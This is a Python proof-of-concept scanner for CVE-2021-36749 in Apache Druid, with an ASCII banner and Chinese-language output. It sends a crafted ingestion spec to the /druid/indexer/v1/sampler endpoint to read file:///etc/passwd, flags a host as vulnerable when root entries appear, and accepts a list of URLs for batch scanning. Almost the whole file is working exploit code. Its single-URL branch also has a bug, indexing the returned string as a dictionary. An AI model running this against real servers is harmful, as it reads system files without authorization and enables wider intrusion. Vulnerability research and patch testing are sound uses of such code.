#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import requests
from bs4 import BeautifulSoup
import re
import json

def poc(target):
    url = target.strip('/') + '/druid/indexer/v1/sampler?for=connect'
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Connection": "close",
        "Content-Type": "application/json"
    }
    json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    try:
        response = requests.post(url, headers=headers, json=json_data, timeout=10, verify=False)
        response_text = response.text
        if 'root:x:0' in response_text:
            # return {
            #     'title': '{} 存在Apache Druid任意文件读取漏洞(CVE-2021-36749)'.format(target),
            #     #'desc': '{} 存在Apache Druid任意文件读取漏洞, 返回内容为: {}'.format(target, response_text)
            #     'desc':response_text
            #
            # }
            return "[+] {} 存在Apache Druid任意文件读取漏洞(CVE-2021-36749)".format(target)
        else:
            return "[-] {} 不存在Apache Druid任意文件读取漏洞(CVE-2021-36749)".format(target)
    except Exception:
        pass

if __name__ == "__main__":
    print('''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██╗     ██████╗  ██████╗███████╗██╗  ██╗ █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗███║     ╚════██╗██╔════╝╚════██║██║  ██║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗█████╔╝███████╗    ██╔╝███████║╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚═══██╗██╔═══██╗  ██╔╝ ╚════██║ ╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗ ██║     ██████╔╝╚██████╔╝  ██║       ██║ █████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝     ╚═════╝  ╚═════╝   ╚═╝       ╚═╝ ╚════╝ 
                                                                                             
                        Apache Druid任意文件读取漏洞(CVE-2021-36749)     by luckyZ          
    ''')
    print("*"*50)

    parser = argparse.ArgumentParser(description='Apache Druid任意文件读取漏洞(CVE-2021-36749)')
    parser.add_argument('-u', type=str, help='url')
    parser.add_argument('-f', help='file', type=str)
    args = parser.parse_args()
    if args.u:
        r = poc(args.u)
        print(r['title'])
    if args.f:
        with open(args.f,"r") as f:
            for url in f.readlines():
                url = url.strip("\n").strip(" ")
                r = poc(url)
                #print(type(r))
                print(r)


    # url = ""
    # res = poc(url)
    # res = str(res['desc'])
    # print(res)
    # #resp = re.findall(r'^input":{"a":"(.+?)"}',res)
    # print(resp)



